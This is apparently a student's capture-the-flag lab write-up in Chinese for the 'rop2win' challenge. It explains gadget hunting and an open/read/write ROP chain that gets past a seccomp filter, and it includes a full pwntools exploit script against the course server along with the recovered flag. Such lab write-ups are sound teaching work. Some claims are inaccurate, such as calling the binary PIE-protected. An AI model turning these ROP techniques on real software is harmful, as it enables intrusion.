# Lab rop2win

1. 先用 checksec 確認這個程式的保護機制，及嘗試執行程式，稍微看一下他的運作，要輸入 filename、ROP 還有 overflow，這題有 PIE 保護，所以在執行的程式記憶體位置會是固定的，也就是說在 local 端可以拿到 flag，在 server 端也可以拿到 flag。

![截圖 2022-11-29 上午10.10.32.png](Lab%20rop2win%209ac49a359381485894960c5fa7197e97/%25E6%2588%25AA%25E5%259C%2596_2022-11-29_%25E4%25B8%258A%25E5%258D%258810.10.32.png)

![截圖 2022-11-29 上午10.10.48.png](Lab%20rop2win%209ac49a359381485894960c5fa7197e97/%25E6%2588%25AA%25E5%259C%2596_2022-11-29_%25E4%25B8%258A%25E5%258D%258810.10.48.png)

1. 這題題目是 rop2win ，所以知道要用 ROP 去解這題，接下來我將Source code 看完，對 code 的理解上面的 Seccomp 是在撰寫 Seccomp rule，並且 allow open/ read/ wtire/ exit，而這題也因為有 Secccomp 所以不能用 execev(“/bin/sh”, null, null) 這個 sycscall 去執行 bin/sh ，所以只能用它允許的 open、read、write 去讀 flag。

![截圖 2022-11-29 上午10.22.06.png](Lab%20rop2win%209ac49a359381485894960c5fa7197e97/%25E6%2588%25AA%25E5%259C%2596_2022-11-29_%25E4%25B8%258A%25E5%258D%258810.22.06.png)

1. 用 gdb 開啟程式，執行到 0x4018ab <main+310> **call** read 後，可以看到 fn 的位置存在 0x4e3340 ，執行到 **0x4018d8** **<main+355> call** read 後，可以看到 ROP 的位置存在 0x4e3360，然後輸入指令 “x/100gx 0x4e3340 “檢查後也確實是如此。執行到 **0x4018ec** **<main+375>**  **call** printf，可以看到會將給的 overflow input 放在 ROP 這個位置，來執行 ROP。

![截圖 2022-11-29 上午10.13.34.png](Lab%20rop2win%209ac49a359381485894960c5fa7197e97/%25E6%2588%25AA%25E5%259C%2596_2022-11-29_%25E4%25B8%258A%25E5%258D%258810.13.34.png)

![截圖 2022-11-29 上午10.15.09.png](Lab%20rop2win%209ac49a359381485894960c5fa7197e97/%25E6%2588%25AA%25E5%259C%2596_2022-11-29_%25E4%25B8%258A%25E5%258D%258810.15.09.png)

![截圖 2022-11-29 上午10.27.33.png](Lab%20rop2win%209ac49a359381485894960c5fa7197e97/%25E6%2588%25AA%25E5%259C%2596_2022-11-29_%25E4%25B8%258A%25E5%258D%258810.27.33.png)

![截圖 2022-11-29 上午10.16.56.png](Lab%20rop2win%209ac49a359381485894960c5fa7197e97/%25E6%2588%25AA%25E5%259C%2596_2022-11-29_%25E4%25B8%258A%25E5%258D%258810.16.56.png)

1. 接下來，我們要利用 open、read、write 將藏在 “/home/chal/flag” 的 flag 讀出來( 從docker 的file 中可以看到 )， 所以會要寫一個 ROP chain，而我這邊先參考老師上課 demo 的 ROP chain 會失敗，因此我這邊還是自己重新寫一次 ROP chain，ROP chain 的組成方法是先用ROPgadget 去尋找可以利用的  ROPgadget ，而這些 ROPgadget 是要可以用來控制暫存器  rdi rsi rdx 的值 (這個傳遞參數的順序是 calling convention ) 來達到 syscall。

![截圖 2022-11-29 上午10.38.07.png](Lab%20rop2win%209ac49a359381485894960c5fa7197e97/%25E6%2588%25AA%25E5%259C%2596_2022-11-29_%25E4%25B8%258A%25E5%258D%258810.38.07.png)

1. 以下是我寫出 ROP chain 的過程 ( 這邊花了最多時間去理解ROP 跟 如何去組成一個 ROPchain 也有去參考 angelboy 的教學，也學到了三個 syscall 的呼叫方式 ) 
    1. open : open(fn_addr, 0) 因為可以找到 “pop rdi ; ret”、“pop rsi ; ret”、“pop rax ; ret”，所以這幾個 gadget 是可以直接拿來用的，因此可以直接生成 open ( fn_addr , 0 ) 的 syscall，因為 open 只需要傳遞兩個參數，所以有 rdi 跟 rsi 就可以了。
        
        ![截圖 2022-12-01 上午1.18.26.png](Lab%20rop2win%209ac49a359381485894960c5fa7197e97/%25E6%2588%25AA%25E5%259C%2596_2022-12-01_%25E4%25B8%258A%25E5%258D%25881.18.26.png)
        
        ![截圖 2022-12-01 上午1.18.41.png](Lab%20rop2win%209ac49a359381485894960c5fa7197e97/%25E6%2588%25AA%25E5%259C%2596_2022-12-01_%25E4%25B8%258A%25E5%258D%25881.18.41.png)
        
        ![截圖 2022-12-01 上午1.19.03.png](Lab%20rop2win%209ac49a359381485894960c5fa7197e97/%25E6%2588%25AA%25E5%259C%2596_2022-12-01_%25E4%25B8%258A%25E5%258D%25881.19.03.png)
        
        ```
        pop_rdi, fn_addr,
        pop_rsi, 0,
        pop_rax, 2,
        syscall,
        ```
        
    2. read : read(3, fn, 0x30) 因為有三個參數要傳遞，但是無法找到單一的 “pop rdx ; ret”，所以只能找找看其他的 gadget，然後找到剛好有一個pop rdx ; pop rbx ; ret，就直接將它拿來用，所以就可以用它來生成 read 的 syscall 。
        
        ![截圖 2022-12-01 上午1.33.35.png](Lab%20rop2win%209ac49a359381485894960c5fa7197e97/%25E6%2588%25AA%25E5%259C%2596_2022-12-01_%25E4%25B8%258A%25E5%258D%25881.33.35.png)
        
        ```
            pop_rdi, 3,
            pop_rsi, fn_addr,
            pop_rdx_rbx , 0x30, 0,
            pop_rax, 0,
            syscall,
        ```
        
    
    c. write : 然後是 write(1, fn, 0x30) 的 syscall ，這邊的原理跟上面一樣。
    
    ```
        pop_rdi, 1,
    		pop_rsi, fn_addr,
        pop_rdx_rbx , 0x30, 0,
        pop_rax, 1,
        syscall,
    ```
    

1. 最後把新的 ROP chain 組成 payload 送出，就得到FLAG{banana_72b302bf297a228a75730123efef7c41}。
    
    ```python
    #!/usr/bin/python3
    
    from pwn import *
    import sys
    
    context.arch = 'amd64'
    context.terminal = ['tmux', 'splitw', '-h']
    r = remote('edu-ctf.zoolab.org', 10005)
    
    ROP_addr = 0x4e3360
    fn_addr = 0x4e3340
    
    pop_rdi = 0x4038b3 # pop rdi ; ret   
    pop_rsi = 0x402428 # pop rsi ; ret
    pop_rdx = 0x40176f # pop rdx ; ret ?
    pop_rax = 0x45db87 # pop rax ; ret
    syscall = 0x4284b6 # syscall ; ret 
    pop_rax_rdx_rbx = 0x493a2a # pop rdi ; 
    pop_rdx_rbx = 0x493a2b # pop rdx ; pop rbx ; ret ;
    leave = 0x40190c # leave ; ret
    
    #open("/home/chal/flag",0)
    #read(3, fn, 0x30)
    #write(1, fn, 0x30)
    
    #ROP chain
    ROP = flat(
        pop_rdi, fn_addr,
        pop_rsi, 0,
        pop_rax, 2,
        syscall,
    
        pop_rdi, 3,
        pop_rsi, fn_addr,
        pop_rdx_rbx , 0x30, 0,
        pop_rax, 0,
        syscall,
    
        pop_rdi, 1,
        pop_rdx_rbx , 0x30, 0,
        pop_rax, 1,
        syscall,
    )
    
    r.sendafter(b'Give me filename: ', b'/home/chal/flag\x00')
    r.sendafter(b'Give me ROP: ', b'A'*0x8 + ROP)
    r.sendafter(b'Give me overflow: ', b'A'*0x20 + p64(ROP_addr) + p64(leave))
    FLAG = r.recvall()
    print(FLAG)
    ```
    

1. 而理解完 ROPchain 後，其實也可以發現，read / write ，改變的參數只有傳遞的第一個參數，甚至直接 pop rdi, 1, 後再 system 後也可以達到一樣的 syscall，而我這邊也驗證過，確實可以得到一樣的結果。

```python
# read(3, fn, 0x30)
# write(1, fn, 0x30)
```

```python
ROP = flat(
    pop_rdi, fn_addr,
    pop_rsi, 0,
    pop_rax, 2,
    syscall,

    pop_rdi, 3,
    pop_rsi, fn_addr,
    pop_rdx_rbx , 0x30, 0,
    pop_rax, 0,
    syscall,

    pop_rdi, 1,
    pop_rax, 1,
    syscall,
)
```